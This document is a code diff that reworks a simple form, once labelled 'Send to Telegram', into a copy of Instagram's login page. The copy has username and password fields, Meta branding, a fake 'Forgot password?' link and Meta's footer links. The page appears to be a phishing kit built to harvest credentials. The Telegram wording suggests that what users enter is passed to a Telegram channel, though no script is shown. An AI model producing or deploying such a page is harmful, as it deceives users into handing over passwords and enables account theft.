@@ -3,30 +3,55 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Telegram Data</title>
+  <title>Instagram</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 </head>
 <body>
-  <div class="card">
+  <div class="login-card">
     <div class="top-lang">
       <i class="fas fa-globe"></i> English (US)
     </div>
     <div class="logo">
-      <i class="fab fa-telegram-plane"></i> Telegram
+      <i class="fab fa-instagram"></i> Instagram
     </div>
 
-    <form id="telegramForm">
-      <input type="text" id="username" placeholder="Telegram Username" required />
-      <input type="tel" id="phone" placeholder="Phone number (with country code)" required />
-      <input type="text" id="message" placeholder="Optional message" />
-      <button type="submit" class="btn-submit">Send to Telegram</button>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username, email or mobile number" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit" class="btn-login">Log in</button>
     </form>
 
-    <div id="responseMsg" class="response"></div>
+    <a href="#" class="forgot-link">Forgot password?</a>
 
-    <div class="footer-meta">
+    <div class="divider">
+      <span>OR</span>
+    </div>
+
+    <p class="create-account">
+      <a href="#">Create new account</a>
+    </p>
+
+    <div class="meta-footer">
       <i class="fab fa-meta"></i> Meta
+    </div>
+
+    <div id="responseMsg" class="response" style="display:none;"></div>
+
+    <div class="bottom-bar">
+      <a href="#">Meta</a> <span class="dot">•</span>
+      <a href="#">About</a> <span class="dot">•</span>
+      <a href="#">Blog</a> <span class="dot">•</span>
+      <a href="#">Jobs</a> <span class="dot">•</span>
+      <a href="#">Help</a> <span class="dot">•</span>
+      <a href="#">API</a> <span class="dot">•</span>
+      <a href="#">Privacy</a> <span class="dot">•</span>
+      <a href="#">Terms</a> <span class="dot">•</span>
+      <a href="#">Locations</a> <span class="dot">•</span>
+      <a href="#">Instagram Lite</a> <span class="dot">•</span>
+      <a href="#">Threads</a> <span class="dot">•</span>
+      <a href="#">Contact Uploading &amp; Non-Users</a> <span class="dot">•</span>
+      <a href="#">Meta Verified</a>
     </div>
   </div>
 
